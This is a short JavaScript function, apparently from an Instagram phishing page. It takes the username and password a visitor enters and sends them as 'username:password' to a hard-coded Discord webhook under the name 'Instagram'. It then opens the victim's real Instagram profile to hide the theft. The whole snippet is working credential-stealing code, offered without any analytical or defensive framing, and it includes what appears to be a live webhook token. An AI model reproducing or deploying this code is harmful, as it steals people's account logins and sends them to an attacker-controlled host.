function sendMessage() {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/822852103390625802/cQ2tUg7Oz30sFRt27X0xO88nWZrr3JymmfV4uBvwL116AQAtn4SZwyoXCoCWdrYUA5eA");

    request.setRequestHeader('Content-type', 'application/json');

    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    let data = username+":"+password

    var params = {
      username: "Instagram",
      avatar_url: "",
      content: data
    }

    let link = "http://instagram.com/"+username

    window.open(link)

    request.send(JSON.stringify(params));
  }